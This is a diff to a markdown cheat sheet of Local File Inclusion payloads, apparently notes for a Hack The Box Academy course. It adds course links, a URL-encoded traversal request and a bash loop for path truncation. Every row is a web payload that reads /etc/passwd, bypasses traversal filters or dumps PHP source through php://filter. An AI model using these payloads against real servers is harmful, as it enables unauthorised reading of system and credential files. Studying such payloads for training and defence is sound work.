@@ -8,15 +8,17 @@
 | **Command** | **Description** |
 | --------------|-------------------|
 | **Basic LFI** |
-| `/index.php?language=/etc/passwd` | Basic LFI |
-| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
-| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
+| `/index.php?language=/etc/passwd` | [Basic LFI](https://academy.hackthebox.com/module/23/section/250) |
+| `/index.php?language=../../../../etc/passwd` | LFI with path traversal - This is method to identify valid users on target server. |
+| `/index.php?language=/../../../etc/passwd` | LFI with name prefix. |
+| `GET /index.php?language=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | [Using the file inclusion find the name of a user on the system](https://academy.hackthebox.com/module/23/section/251) |
 | `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
 | **LFI Bypasses** |
-| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
+| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path [traversal filter](https://academy.hackthebox.com/module/23/section/1491) |
 | `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
 | `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
-| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
+| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | This bash script will produce the required 2048 times string traversal path |
+| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with `null byte` (obsolete) |
 | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |
 
 
